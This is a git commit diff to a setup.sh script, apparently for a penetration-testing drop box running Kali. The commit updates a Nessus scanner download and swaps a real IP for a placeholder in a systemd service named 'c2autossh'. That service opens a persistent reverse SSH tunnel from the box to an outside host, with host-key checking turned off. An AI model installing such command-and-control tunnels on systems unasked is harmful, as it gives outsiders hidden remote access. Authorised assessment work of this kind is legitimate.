1e8fe3a82dcffb0006c55c019e06407f887eca8c
evalian-it <120847221+evalian-it@users.noreply.github.com>
2023-03-14 18:29:43 +0000

    Update setup.sh
    Update with latest Nessus package, replace ssh IP address with placeholder

--- setup.sh
+++ setup.sh
@@ -2,10 +2,10 @@
 
 # Install Nessus
 curl --request GET \
-  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.4.2-debian9_amd64.deb' \
-  --output 'Nessus-10.4.1-debian9_amd64.deb'
+  --url 'https://www.tenable.com/downloads/api/v2/pages/nessus/files/Nessus-10.5.0-debian10_amd64.deb' \
+  --output 'Nessus-10.5.0-debian10_amd64.deb'
 
-yes | dpkg -i Nessus-10.4.1-debian9_amd64.deb
+yes | dpkg -i Nessus-10.5.0-debian10_amd64.deb
 
 # Install auto-ssh & connection script
 touch /lib/systemd/system/c2autossh.service
@@ -18,7 +18,7 @@ After=network.target
 Environment="AUTOSSH_GATETIME=0"
 User=kali
 Group=kali
-ExecStart=/usr/bin/autossh -M 11166 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -o "StrictHostKeyChecking no" -i /home/kali/.ssh/id_rsa -R 6667:localhost:22 kali@165.232.32.154
+ExecStart=/usr/bin/autossh -M 11166 -N -f -o "PubkeyAuthentication=yes" -o "PasswordAuthentication=no" -o "StrictHostKeyChecking no" -i /home/kali/.ssh/id_rsa -R 6667:localhost:22 kali@[ip]
 RemainAfterExit=yes
 [Install]
 WantedBy=multi-user.target
